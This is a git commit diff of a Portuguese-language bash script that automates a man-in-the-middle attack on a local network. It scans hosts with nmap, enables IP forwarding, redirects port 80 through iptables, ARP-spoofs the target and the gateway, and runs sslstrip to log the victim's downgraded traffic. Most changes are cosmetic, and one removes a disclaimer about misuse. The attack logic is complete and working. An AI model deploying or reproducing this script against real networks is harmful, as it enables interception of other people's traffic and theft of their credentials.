f71907d84472fc73a3d91c510b6e86cd98a26ec3
joao-lucas <joaolucas@linuxmail.org>
2016-07-16 20:14:56 -0300

    MiTM SSLStrip

--- sslstrip.sh
+++ sslstrip.sh
@@ -10,17 +10,16 @@
 DATA=$(date +'%d-%m-%Y-%H-%M')
 PREFIX=/home/jsouza/
 ARQ=cap_$DATA.log
-BANNER=$( figlet -f block -c "souz4" )
+BANNER=$(figlet -f block -c "souz4")
 
 menu(){
-	echo "########################MENU##############################"
-	echo "########salvando em: $ARQ#############"
-	echo "##########################################################"
-	echo "1. Identificar gateway"
-	echo "2. Identificar target"
-	echo "3. Iniciar"
-	echo "4. Instalar dependências(Debian e devirados)"
-	echo "99. Sair"
+	echo -e "\033[0;37m $BANNER\033[0m" 
+	echo -e "############salvando em: cap_$DATA.log###############"
+	echo -e " \033[1;34m 1.\033[0m Identificar gateway" 
+	echo -e " \033[1;34m 2.\033[0m Identidicar hosts"
+	echo -e " \033[1;34m 3.\033[0m Iniciar" 
+	echo -e " \033[1;34m 4.\033[0m Instalar dependencias(Debian e derivados)"
+	echo -e " \033[1;34m 5.\033[0m Sair" 
 	read -p "> Opção: " opt
 	
 	case $opt in
@@ -37,11 +36,11 @@ get_router(){
 	ip_router=$(route -n | awk '{print $2}' | grep [1-9])
 	if [ $? -eq 0 ]
 	then
-		echo "> GATEWAY: $ip_router"
-		sleep 3
+		#echo -e "> GATEWAY: $ip_router"
+		echo -e "\n \033[1;33m ~ GATEWAY: $ip_router \033[0m" 
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros!"
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros!"
 		sleep 2
 		exit 0
 	fi
@@ -52,54 +51,56 @@ scan_target(){
 	nmap -Pn -T3 $REDE/24 > scan_hosts.txt 2> /dev/null
 	if [ $? -eq 0 ]	
 	then
-		echo "[ OK ] Esses foram os hosts encontrados!"
-		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | less	
-		echo "> Escolha o alvo."
+		echo -e " \033[1;33m ~ Esses foram os hosts encontrados! \033[0m"
+		egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' scan_hosts.txt | awk '{print $5}' | grep [1-9]
+		echo " ~ Escolha o alvo."
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros em encontrar os hosts"
+		echo -e "\n[\033[0;31m FALHA\033[0m ] Ocorreram erros em encontrar os hosts"
 		sleep 2
 		exit 0
 	fi
 }
 
 iniciar_ataque(){ 
-	echo -e "\n ~ Ativando o ip forward"
+	# Ativando o ip forward, para permitir o roteamento de pacotes entre as interfaces de rede"
 	echo 1 > /proc/sys/net/ipv4/ip_forward
-	echo -e "\n ~ Limpando regras da tabela NAT do iptables"
+	# Limpando regras da tabela NAT do iptables"
 	iptables -t nat -F
-	echo -e "\n ~ Redirecionando o trafego da porta 80 para 10000"
+	# Redirecionando o trafego da porta 80 para 10000"
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 	if [ $? -eq 0 ]
 	then
-		echo -e "\n [ OK ] Regras criadas com sucesso!"	
+		echo -e "\n [\033[0;32m OK\033[0m ] Regras criadas com sucesso!"	
  		read -p "> TARGET: " ip_target
 		read -p "> GATEWAY: " ip_router
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 $ip_router -t $ip_target" &
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 -t $ip_target $ip_router" &
 		echo -e "\n ~ Iniciando o sslstrip..."
-		echo -e "\n ~ Salvando em: $ARQ"
-		echo -e "\n CAPTURA: $DATA" > $ARQ 2> /dev/null	
-		nohup xterm -e 2> /dev/null "sslstrip -l 10000  >> $ARQ" &	
+		#touch $ARQ
+		echo "DATA: $DATA" > $ARQ
+		nohup xterm -e 2> /dev/null "nice -n -10 tail -f $ARQ 2> /dev/null" &
+		nohup xterm -e 2> /dev/null "sslstrip -l 10000 -w $ARQ" &		
+		#echo "~ Vizualizando o arquivo..."
+		#nice -n -20 tail -f $ARQ
 	else
-		echo -e "\n [ FALHA ] Ocorreram erros em criar regras."
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em criar regras."
 		sleep 2
 		exit 0
 	fi
-	tail -f $ARQ
 }
 
 install_req(){
-	echo -e "\n ~ Essa opção só esta disponivel para debian e derivados"
+	# Essa opção só esta disponivel para debian e derivados
 	echo -e "\n ~ Atualizando  a lista de repositórios..." 
 	apt-get update
 	echo -e "\n ~ Instalando os pocotes requeridos..."
-	apt-get install dsniff sslstrip xterm figleti nmap -y
+	apt-get install dsniff sslstrip xterm figlet nmap -y
 	if [ $? -eq 0 ]
 	then
-		echo "[ OK ]Os pacotes necessários foram instalados!"
+		echo -e "\n [\033[0;32m OK\033[0m ] Os pacotes necessários foram instalados!"
 	else
-		echo "[ FALHA ] Os pacotes não foram encontrados."
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Os pacotes não foram encontrados."
 	fi
 }
 
@@ -107,13 +108,10 @@ while true
 do
 	if [ $UID -eq 0 ]
 	then
-		echo "$BANNER"
-		echo "O autor não se responsabiliza por qualquer ato feito com má fé utilizando esse script" 
-		sleep 3
 		clear
 		menu
 	else
-		echo "Execute o script como root!"
+		echo "~ Execute o script como root!"
 		sleep 3
 		exit 0
 	fi
